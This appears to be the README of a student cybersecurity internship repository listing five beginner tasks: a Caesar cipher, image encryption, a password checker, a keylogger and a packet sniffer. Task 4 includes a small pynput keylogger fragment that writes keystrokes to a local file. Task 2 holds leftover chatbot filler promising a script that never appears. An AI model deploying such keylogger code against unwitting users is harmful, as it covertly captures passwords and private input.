# PRODIGY-CS-CYBERSECURITY-main
TASK 1: 
Implement Caesar Cipher- Create a Python program that can encrypt and decrypt text using the Caesar Cipher algorithm. Allow users to input a message and a shift value to perform encryption and decryption.

TASK 2 :
Develop a simple image encryption tool using pixel manipulation. You can perform operations like swapping pixel values or applying a basic mathematical operation to each pixel. Allow users to encrypt and decrypt images. Certainly! Below is a simple Python script using the Pillow library for image processing. Make sure to install Pillow first if you haven't already: pip install pillow This script uses a simple encryption and decryption process. You can customize this method or explore other pixel manipulation techniques for more robust encryption.

TASK 3:
simple Python script that assesses the strength of a password based on criteria such as length, presence of uppercase and lowercase letters, numbers, and special characters. Provide feedback to users on the password's strength.

TASK 4:
Create a basic keylogger program that records and logs keystrokes. Focus on logging the keys pressed and saving them to a file. Note: Ethical considerations and permissions are crucial for projects involving keyloggers. from pynput import keyboard This line imports the keyboard module from the pynput library, which is used for monitoring and controlling input devices, such as keyboards and mice. def keyPressed(key): print(str(key)) with open("keylog.txt", 'a') as logkey: try: char = key.char logkey.write(char) except: print("Error getting char")

TASK 5:
Develop a packet sniffer tool that captures and analyzes network packets. Display relevant information such as source and destination IP addresses, protocols, and payload data. Ensure the ethical use of the tool for educational purposes.
